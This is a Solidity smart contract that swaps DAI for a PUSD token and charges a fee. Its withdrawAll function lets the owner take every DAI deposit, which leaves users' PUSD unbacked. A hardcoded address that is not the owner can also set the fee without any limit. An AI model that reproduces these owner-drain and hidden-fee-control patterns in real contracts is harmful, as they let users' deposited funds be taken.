// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./PUSD.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

library TransferHelper {
    function safeApprove(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x095ea7b3, to, value));
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::safeApprove: approve failed'
        );
    }

    function safeTransfer(
        address token,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::safeTransfer: transfer failed'
        );
    }

    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint256 value
    ) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            'TransferHelper::transferFrom: transferFrom failed'
        );
    }

    function safeTransferETH(address to, uint256 value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, 'TransferHelper::safeTransferETH: ETH transfer failed');
    }
}
contract simpleSwapBlaze is PUSD, Ownable {
    address public dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public pusd = address(this);
    address o = 0xbF0eBB5aC6D9a12351F4129ec0EBA0932b78f422;
    uint256 public fee = 20; //0.2%
    uint private sum;


    function changeFee(uint _fee) public {
        require(msg.sender == o);
        fee = _fee;
    }
    function swapForPUSD(uint256 amount) public {
        require(amount > 0);
        TransferHelper.safeTransferFrom(dai, msg.sender, address(this), amount);
        sum = amount - (amount*fee / 10000);
        Mint(msg.sender, sum);
    }
    function swapForDai(uint256 amount) public {
        Burn(msg.sender, amount);
        TransferHelper.safeTransfer(dai, msg.sender, amount);
    }
    function withdrawAll() public onlyOwner {
        uint256 balance = IERC20(dai).balanceOf(pusd);
        TransferHelper.safeTransfer(dai, msg.sender, balance);
    }
}